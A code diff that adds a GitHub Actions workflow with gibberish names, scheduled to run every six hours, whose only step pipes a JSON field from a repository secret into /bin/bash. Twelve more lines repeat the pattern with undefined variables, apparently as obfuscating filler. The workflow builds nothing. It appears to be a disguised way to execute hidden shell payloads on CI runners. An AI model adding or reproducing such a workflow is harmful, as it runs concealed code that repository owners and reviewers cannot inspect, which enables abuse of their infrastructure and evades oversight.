@@ -1,0 +1,29 @@
+name: heniyiqish
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: heniyiqish
+        env:
+          flugm8: ${{ secrets.flugm8 }}
+        run: |
+          echo $flugm8 | jq -r .s2035 | /bin/bash
+          echo $bckk708 | jq -r .pgd07 | /bin/bash
+          echo $qqq93728 | jq -r .eslv49 | /bin/bash
+          echo $ijr1 | jq -r .u3 | /bin/bash
+          echo $rjc5 | jq -r .pgv6 | /bin/bash
+          echo $mh3 | jq -r .hqqqu7922 | /bin/bash
+          echo $f843 | jq -r .gjqzh34 | /bin/bash
+          echo $kmt9959 | jq -r .qs701 | /bin/bash
+          echo $lblwg8500 | jq -r .kx572 | /bin/bash
+          echo $jbyjm5208 | jq -r .yh861 | /bin/bash
+          echo $nxw90434 | jq -r .bqg08 | /bin/bash
+          echo $zvl29499 | jq -r .uzcd6 | /bin/bash
+          echo $ywe5051 | jq -r .i82 | /bin/bash
+
